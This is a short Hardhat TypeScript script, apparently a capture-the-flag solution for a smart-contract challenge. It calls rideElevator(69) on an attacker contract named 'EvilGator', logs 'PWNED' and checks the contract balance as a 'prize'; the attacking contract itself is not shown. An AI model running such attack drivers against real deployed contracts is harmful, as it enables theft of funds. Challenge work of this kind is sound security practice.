import { ethers } from "hardhat"
import { getSigner } from "../utils"
import { ADDRESSES } from "../consts"

async function pwn() {
    const signer = await getSigner()
    const contract = await ethers.getContractAt(
        "EvilGator",
        ADDRESSES.evilGator,
        signer
    )

    const donate = await contract.rideElevator(69)
    console.log("PWNING")
    const receipt = await donate?.wait()
    console.log(receipt)
    console.log("PWNED")
    console.log("CLAIMING PRIZE< GO TO TRUFFLE DASHBOARD")
    const prize = await signer?.provider?.getBalance(contract.address)
    console.log(prize)
    console.log("PRIZE CLAIMED")
}
pwn()